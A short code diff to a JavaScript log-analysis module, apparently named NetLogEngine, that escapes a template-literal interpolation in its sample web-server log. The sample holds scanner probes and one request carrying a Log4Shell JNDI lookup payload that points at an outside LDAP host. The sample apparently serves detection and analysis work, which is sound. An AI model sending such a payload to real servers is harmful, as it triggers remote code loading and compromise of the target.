@@ -567,7 +567,7 @@ const NetLogEngine = (() => {
 91.108.4.155  - - [10/Apr/2024:02:16:02 +0000] "GET /admin HTTP/1.1" 404 214 "-" "zgrab/0.x"
 91.108.4.155  - - [10/Apr/2024:02:16:03 +0000] "GET /wp-admin HTTP/1.1" 404 214 "-" "zgrab/0.x"
 185.220.101.47 - - [10/Apr/2024:16:34:01 +0000] "POST /upload HTTP/1.1" 200 2621440 "-" "curl/7.84.0"
-185.220.101.47 - - [10/Apr/2024:16:35:00 +0000] "POST /cmd?c=${jndi:ldap://185.220.101.47:1389/a} HTTP/1.1" 500 0 "-" "Log4Shell-Exploit/1.0"`;
+185.220.101.47 - - [10/Apr/2024:16:35:00 +0000] "POST /cmd?c=\${jndi:ldap://185.220.101.47:1389/a} HTTP/1.1" 500 0 "-" "Log4Shell-Exploit/1.0"`;
 
   return { analyze, SAMPLE };
 })();
